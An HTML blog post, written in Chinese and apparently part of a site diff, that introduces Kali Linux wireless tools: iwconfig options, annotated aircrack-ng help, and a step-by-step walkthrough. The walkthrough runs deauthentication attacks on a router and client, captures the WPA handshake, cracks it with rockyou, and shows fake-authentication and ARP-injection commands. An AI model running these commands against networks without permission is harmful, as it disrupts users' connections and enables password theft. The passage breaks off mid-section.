@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.lug.ustc.edu.cn/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"xchcloud.cn","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null,"changyan":{"text":"Load Disqus","order":-1}},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="工具集合无线攻击篇持续更新中～  下次更新尽量一个月内吧，有些地方还是晦涩难懂。 蓝牙工具集合">
+<meta name="keywords" content="linux,kali,无线安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali-linux工具简介">
+<meta property="og:url" content="http://xchcloud.cn/kali-linux工具简介/index.html">
+<meta property="og:site_name" content="chaoz的杂货铺">
+<meta property="og:description" content="工具集合无线攻击篇持续更新中～  下次更新尽量一个月内吧，有些地方还是晦涩难懂。 蓝牙工具集合">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-09-11T08:58:57.940Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="kali-linux工具简介">
+<meta name="twitter:description" content="工具集合无线攻击篇持续更新中～  下次更新尽量一个月内吧，有些地方还是晦涩难懂。 蓝牙工具集合">
+
+<link rel="canonical" href="http://xchcloud.cn/kali-linux工具简介/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>kali-linux工具简介 | chaoz的杂货铺</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">chaoz的杂货铺</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">生命有息、学无止境、折腾不止</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xchcloud.cn/kali-linux工具简介/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="超超">
+      <meta itemprop="description" content="那天早上雾散了，不止早上、不止雾。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chaoz的杂货铺">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          kali-linux工具简介
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-23 19:21:54" itemprop="dateCreated datePublished" datetime="2020-03-23T19:21:54+08:00">2020-03-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-09-11 16:58:57" itemprop="dateModified" datetime="2021-09-11T16:58:57+08:00">2021-09-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Changyan：</span>
+    
+    
+      <a title="changyan" href="/kali-linux工具简介/#SOHUCS" itemprop="discussionUrl">
+        <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="kali-linux工具简介/" itemprop="commentCount"></span>
+      </a>
+    
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>26k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>24 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="工具集合"><a href="#工具集合" class="headerlink" title="工具集合"></a>工具集合</h1><h2 id="无线攻击篇"><a href="#无线攻击篇" class="headerlink" title="无线攻击篇"></a>无线攻击篇</h2><p>持续更新中～  下次更新尽量一个月内吧，有些地方还是晦涩难懂。</p>
+<h3 id="蓝牙工具集合"><a href="#蓝牙工具集合" class="headerlink" title="蓝牙工具集合"></a>蓝牙工具集合</h3><a id="more"></a>
+<h3 id="无线工具集合"><a href="#无线工具集合" class="headerlink" title="无线工具集合"></a>无线工具集合</h3><h4 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h4><p>系统配置无线网络设备或显示无线网络设备信息的命令。iwconfig命令类似于ifconfig命令，但是他配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段</p>
+<h5 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h5><p><code>iwconfig interface [选项]</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Usage: iwconfig [interface]</span><br><span class="line">	interface essid &#123;NNN|any|on|off&#125;</span><br><span class="line">	interface mode &#123;managed|ad-hoc|master|...&#125;</span><br><span class="line">	interface freq N.NNN[k|M|G]</span><br><span class="line">	interface channel N</span><br><span class="line">	interface bit &#123;N[k|M|G]|auto|fixed&#125;</span><br><span class="line">	interface rate &#123;N[k|M|G]|auto|fixed&#125;</span><br><span class="line">	interface enc &#123;NNNN-NNNN|off&#125;</span><br><span class="line">	interface key &#123;NNNN-NNNN|off&#125;</span><br><span class="line">	interface power &#123;period N|timeout N|saving N|off&#125;</span><br><span class="line">	interface nickname NNN</span><br><span class="line">	interface nwid &#123;NN|on|off&#125;</span><br><span class="line">	interface ap &#123;N|off|auto&#125;</span><br><span class="line">	interface txpower &#123;NmW|NdBm|off|auto&#125;</span><br><span class="line">	interface sens N</span><br><span class="line">	interface retry &#123;limit N|lifetime N&#125;</span><br><span class="line">	interface rts &#123;N|auto|fixed|off&#125;</span><br><span class="line">	interface frag &#123;N|auto|fixed|off&#125;</span><br><span class="line">	interface modulation &#123;11g|11a|CCK|OFDMg|...&#125;</span><br><span class="line">	interface commit </span><br><span class="line"></span><br><span class="line">    auto： 自动模式</span><br><span class="line">    essid：设置ESSID  //设置ESSID(或网络名称——在某些产品中也可以称为域ID)。ESSID用于标识属于同一虚拟网络的单元。与定义单个单元的AP地址或NWID不同，ESSID定义了通过中继器或基础设施连接的一组单元，用户可以在这些单元中透明地漫游。对于某些卡片，您可以使用off或any(和on来重新启用它)禁用ESSID检查(ESSID混杂)。如果您的网络的ESSID是一个特殊的关键字(off、on或any)，您应该使用——以转义它。</span><br><span class="line">    nwid：设置网络ID  // 设置网络ID。由于所有相邻的无线网络共享相同的介质，该参数用于区分它们(创建逻辑并列网络)并识别属于同一单元的节点。此参数仅用于802.11之前的硬件，802.11协议使用此功能的ESSID和AP地址。对于某些卡，可以使用off(和on)禁用网络ID检查(NWID混杂)来重新启用它。</span><br><span class="line">    freq： 设置无线网络通信频段/率</span><br><span class="line">    chanel： 设置无线网络通信信道   </span><br><span class="line">    sens： 设置无线网络设备的感知阀值 //适当设置这些阈值可以防止卡在接收微弱信号的同时浪费时间在背景噪声上。默认现在硬件感知都自动化了吧。</span><br><span class="line">    mode： 设置无线网络设备的通信设备</span><br><span class="line">    ap： 强迫无线网卡向给定地址的接入点注册 /使用off来重新启用自动模式，而不需要更改当前的访问点，或者您可以使用any或auto来强制卡与当前最佳的访问点重新关联。</span><br><span class="line">    nick&lt;名字&gt;： 为网卡设定别名</span><br><span class="line">    rate&lt;速率&gt;： 设定无线网卡的速率</span><br><span class="line">    rts&lt;阀值&gt;： 在传输数据包之前增加一次握手，确信信道在正常的</span><br><span class="line">    power： 无线网卡的发射功率设置</span><br><span class="line">    总结：保持默认吧，又不是老古董的网卡了，有特殊需求，恶劣条件下可考虑极限值尝试？</span><br></pre></td></tr></table></figure></p>
+<h4 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h4><h5 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&gt; Executing “aircrack-ng --help”</span><br><span class="line"></span><br><span class="line">  Aircrack-ng 1.6  - (C) 2006-2020 Thomas d&apos;Otreppe</span><br><span class="line">  https://www.aircrack-ng.org</span><br><span class="line"></span><br><span class="line">  usage: aircrack-ng [options] &lt;input file(s)&gt;</span><br><span class="line"></span><br><span class="line">  Common options:</span><br><span class="line"></span><br><span class="line">      -a &lt;amode&gt; : force attack mode (1/WEP, 2/WPA-PSK)           //强制攻击模式</span><br><span class="line">      -e &lt;essid&gt; : target selection: network identifier                        //目标选择：网络标识符</span><br><span class="line">      -b &lt;bssid&gt; : target selection: access point&apos;s MAC                     //目标选择：通过接入点的MAC</span><br><span class="line">      -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)                    //使用的CPU数量；默认全部</span><br><span class="line">      -q         : enable quiet mode (no status output)                          //启用安静模式（无状态输出）</span><br><span class="line">      -C &lt;macs&gt;  : merge the given APs to a virtual one                   //将给定的AP合并为虚拟AP</span><br><span class="line">      -l &lt;file&gt;  : write key to file. Overwrites file.                             //重写文件，将秘匙写入文件中</span><br><span class="line"></span><br><span class="line">  Static WEP cracking options:                                                        //静态WEP破解选项：</span><br><span class="line"></span><br><span class="line">      -c         : search alpha-numeric characters only</span><br><span class="line">      -t         : search binary coded decimal chr only</span><br><span class="line">      -h         : search the numeric key for Fritz!BOX</span><br><span class="line">      -d &lt;mask&gt;  : use masking of the key (A1:XX:CF:YY)</span><br><span class="line">      -m &lt;maddr&gt; : MAC address to filter usable packets</span><br><span class="line">      -n &lt;nbits&gt; : WEP key length :  64/128/152/256/512</span><br><span class="line">      -i &lt;index&gt; : WEP key index (1 to 4), default: any</span><br><span class="line">      -f &lt;fudge&gt; : bruteforce fudge factor,  default: 2</span><br><span class="line">      -k &lt;korek&gt; : disable one attack method  (1 to 17)</span><br><span class="line">      -x or -x0  : disable bruteforce for last keybytes</span><br><span class="line">      -x1        : last keybyte bruteforcing  (default)</span><br><span class="line">      -x2        : enable last  2 keybytes bruteforcing</span><br><span class="line">      -X         : disable  bruteforce   multithreading</span><br><span class="line">      -y         : experimental  single bruteforce mode</span><br><span class="line">      -K         : use only old KoreK attacks (pre-PTW)</span><br><span class="line">      -s         : show the key in ASCII while cracking</span><br><span class="line">      -M &lt;num&gt;   : specify maximum number of IVs to use</span><br><span class="line">      -D         : WEP decloak, skips broken keystreams</span><br><span class="line">      -P &lt;num&gt;   : PTW debug:  1: disable Klein, 2: PTW</span><br><span class="line">      -1         : run only 1 try to crack key with PTW</span><br><span class="line">      -V         : run in visual inspection mode</span><br><span class="line"></span><br><span class="line">  WEP and WPA-PSK cracking options:</span><br><span class="line"></span><br><span class="line">      -w &lt;words&gt; : path to wordlist(s) filename(s)</span><br><span class="line">      -N &lt;file&gt;  : path to new session filename</span><br><span class="line">      -R &lt;file&gt;  : path to existing session filename</span><br><span class="line"></span><br><span class="line">  WPA-PSK options:</span><br><span class="line"></span><br><span class="line">      -E &lt;file&gt;  : create EWSA Project file v3</span><br><span class="line">      -I &lt;str&gt;   : PMKID string (hashcat -m 16800)</span><br><span class="line">      -j &lt;file&gt;  : create Hashcat v3.6+ file (HCCAPX)</span><br><span class="line">      -J &lt;file&gt;  : create Hashcat file (HCCAP)</span><br><span class="line">      -S         : WPA cracking speed test</span><br><span class="line">      -Z &lt;sec&gt;   : WPA cracking speed test length of</span><br><span class="line">                   execution.</span><br><span class="line">      -r &lt;DB&gt;    : path to airolib-ng database</span><br><span class="line">                   (Cannot be used with -w)</span><br><span class="line"></span><br><span class="line">  SIMD selection:</span><br><span class="line"></span><br><span class="line">      --simd-list       : Show a list of the available</span><br><span class="line">                          SIMD architectures, for this</span><br><span class="line">                          machine.</span><br><span class="line">      --simd=&lt;option&gt;   : Use specific SIMD architecture.</span><br><span class="line"></span><br><span class="line">      &lt;option&gt; may be one of the following, depending on</span><br><span class="line">      your platform:</span><br><span class="line"></span><br><span class="line">                   generic</span><br><span class="line">                   avx512</span><br><span class="line">                   avx2</span><br><span class="line">                   avx</span><br><span class="line">                   sse2</span><br><span class="line">                   altivec</span><br><span class="line">                   power8</span><br><span class="line">                   asimd</span><br><span class="line">                   neon</span><br><span class="line"></span><br><span class="line">  Other options:</span><br><span class="line"></span><br><span class="line">      -u         : Displays # of CPUs &amp; SIMD support</span><br><span class="line">      --help     : Displays this usage screen</span><br></pre></td></tr></table></figure>
+<h5 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h5><h6 id="DEAUTHENTICATION攻击"><a href="#DEAUTHENTICATION攻击" class="headerlink" title="DEAUTHENTICATION攻击"></a>DEAUTHENTICATION攻击</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 0 -a kifi -c &lt;Client MAC&gt; &lt;interface name&gt;</span><br></pre></td></tr></table></figure>
+<p>0就是无限发包，直至打掉<br>    不指定-c参数时，以广播攻击所有客户端<br>    每攻击发送128个包，64个给AP，64个给客户端<br>    物理足够接近被攻击者<br>排错：<br>物理足够接近被攻击者<br>与被攻击者使用相同无限标准b、n、g<br>客户端可能拒绝广播帧，建议指定客户端</p>
+<p>实战步骤：<br>    查看网卡名字：iwconfig<br>    设置网卡为监听模式：airmon-ng  start wlan0<br>    扫描附近的WIFI：airodump-ng  wlan0mon<br>    选定一个路由器，并监听其流量：airodump-ng -w tplink -c 11 –bssid {MAC1} wlan0mon<br>    选定连接的一个客户端，进行攻击：aireplay-ng -0 50 -a {MAC1} -c {MAC2}  wlan0mon<br>    对抓取到的cap包进行暴力破解：aircrack-ng  -w  password.txt  -b {MAC1} tplink-01.cap<br>参考：</p>
+<ol>
+<li><p>查看无线网卡名字：iwconfig   或者  ifconfig  -a   都可以</p>
+</li>
+<li><p>开启网卡监听模式：airmon-ng  start wlan0   。<br> 网卡开启了监听模式之后网卡的名字就变为 wlan0mon  了，以后的所有命令中的网卡名都是叫 wlan0mon</p>
+</li>
+<li><p>扫描附近的WIFI：airodump-ng  wlan0mon<br> 会显示附近所有的WIFI信号。<br>显示数据的参数说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BSSID ：AP端的MAC地址，如果在Client Section中BSSID显示为“not associated”意味着客户端没有和AP连接上</span><br><span class="line">PWR ：信号的水平强度，越大越好</span><br><span class="line">Beacons ：AP发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒发送10个左右的beacon，所以他们能够在很远的地方被发现</span><br><span class="line">#Data： 对应路由器在线吞吐量，数字越大，数据上传量越大（数据越大表示在正常情况下使用的人越多，选择此目标成功率大些</span><br><span class="line">CH ：信号道（对应路由器的所在频道 / 渠道）</span><br><span class="line">MB ：连接速度 / AP支持的最大速率，如果：</span><br><span class="line">  +MB=11，它是802.11b</span><br><span class="line">  +MB=22，它是802.11b+</span><br><span class="line">  +MB&gt;22，它是802.11g</span><br><span class="line">ENC ：使用的加密算法体系</span><br><span class="line">CIPHER ：检测到的加密算法</span><br><span class="line">AUTH ：使用的认证协议</span><br><span class="line">  +MGT（WPA/WPA2使用独立认证的服务器，常见的802.1x、redius、eap等）</span><br><span class="line">  +SKA（WEP的共享密钥）</span><br><span class="line">  +OPN（WEP开放式）</span><br><span class="line">ESSID ：对应的路由器名称（越往上信号越好）</span><br><span class="line">STATION ：客户端的MAC地址</span><br><span class="line">Lost ：在过去10s丢失的数据分组</span><br><span class="line">Probes ：被客户端查探的ESSID，如果客户端正在试图连接一个AP但是没有连接上，那么就显示在这里。</span><br><span class="line">RXQ ：接受质量，用于衡量所有帧和管理所有帧</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>选定一个准备破解的WIFI</p>
+</li>
+<li><p>监听该路由器的流量：<br><code>airodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon   # -w 参数指定生成的文件名  -c 指定信道 --bssid指定路由器的MAC地址</code></p>
+</li>
+<li><p>重新打开一个命令行窗口，开始攻击！之前的窗口继续保留，用于观察是否抓包成功<br><code>aireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon  # 50是发包的数量 -a指定路由器的MAC地址  -c指定连接的客户端的MAC地址</code><br> 该命令会打断连接客户端和WIFI之间的连接，等到客户端重新连接WIFI的时候，就会抓取他们之间的握手认证包！ </p>
+</li>
+<li><p>如果看到[ WPA handshake: MAC]，就说明握手包抓取成功了</p>
+<p> 我们可以在命令行运行的所在目录下，看到会生成四个文件，其中我们有用的文件是以 cap 后缀结尾的文件</p>
+</li>
+<li><p>对抓取到的cap包进行破解，这需要我们准备好破解的密码字典。所以，无论是任何破解，都需要一个强大的密码字典！</p>
+<p> kali下自带有一份无线密码字典——&gt; /usr/share/wordlists/rockyou.txt.gz ，我们将其解压</p>
+<p> <code>aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap #-w指定 密码字典 -b指定路由器的MAC地址</code></p>
+<p> 要想破解出WIFI的密码，需要一个很强大的字典！</p>
+</li>
+</ol>
+<h5 id="其他使用说明"><a href="#其他使用说明" class="headerlink" title="其他使用说明"></a>其他使用说明</h5><p>就是采取不同的漏洞进行破解<br><code>aireplay-ng -0 10 -a ap_mac -c 合法客户端mac wifi0</code></p>
+<p>参数说明：10表示发送次数（设置为0表示循环攻击，客户端无法正常上网）<br>-a设置ap的mac地址，-c设置已连接的合法客户端的mac地址(如果要-c则所有与ap连接的客户端全部断线）</p>
+<h6 id="1-fakeauth-count-伪装一个客户端和ap进行连接"><a href="#1-fakeauth-count-伪装一个客户端和ap进行连接" class="headerlink" title="-1 fakeauth count 伪装一个客户端和ap进行连接"></a>-1 fakeauth count 伪装一个客户端和ap进行连接</h6><p>这是没有客户端研究学习的第一步，因为是没有合法连接的客户端，因此需要一个伪装客户端来和路由器连接。为让ap接受数据包，必须使自己的网卡和ap关联。-1伪装客户端连接成功够才能用发送注入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -1 0 -e ap_essid -a ap_mac -h my_mac wifi0</span><br><span class="line">aireplay-ng -1 0 -e kifi -a &lt;AP MAC&gt; -h &lt;YOUR MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 60 -o 1 -q 10 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br></pre></td></tr></table></figure></p>
+<p>参数说明：<br>0表示延迟0秒后连接；<br>-e设置ap_essid；<br>-a设置ap的mac地址<br>-h设置伪装客户端的网卡mac地址（就是自己网卡的mac地址）<br>-o 1 每次身份认证只发一组认证数据包<br>-q 10 每10秒发keep-live帧</p>
+<p>排错：<br>某些AP验证客户端MAC地址OUI（前三个字节）——&gt;虚假客户端MAC<br>MAC地址过滤<br>Denied（Code 1）is WPA in use<br>    WPA/WPA2不支持Fake authentication<br>使用真实MAC地址<br>离信号太远<br>侦听信道不正确</p>
+<h6 id="2-interactive-交互模式"><a href="#2-interactive-交互模式" class="headerlink" title="-2 interactive 交互模式"></a>-2 interactive 交互模式</h6><p>这个模式集合了抓包和提取数据，发包注入三种功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b ap_mac -h my_mac wifi0</span><br></pre></td></tr></table></figure>
+<p>参数说明：<br>-p设置控制帧中包含的信息（16进制），默认采用0841；<br>-c：设置目标mac地址；<br>-b设置ap的mac地址；<br>-h伪装的客户端网卡mac地址（就是自己的mac地址）<br>提取包，发送注入数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -2 -r myarp -x 1024 wifi0</span><br></pre></td></tr></table></figure>
+<p>参数说明：<br>myarp：自己设置的文件名；<br>-x1024：发包的速度（最大为1024）</p>
+<h6 id="3-arp-request注入攻击模式"><a href="#3-arp-request注入攻击模式" class="headerlink" title="-3 arp-request注入攻击模式"></a>-3 arp-request注入攻击模式</h6><p>这种模式是一种抓包后分析重发的过程<br><code>aireplay-ng -3 -b ap_mac -h 合法客户端mac -x 512 wifi0</code></p>
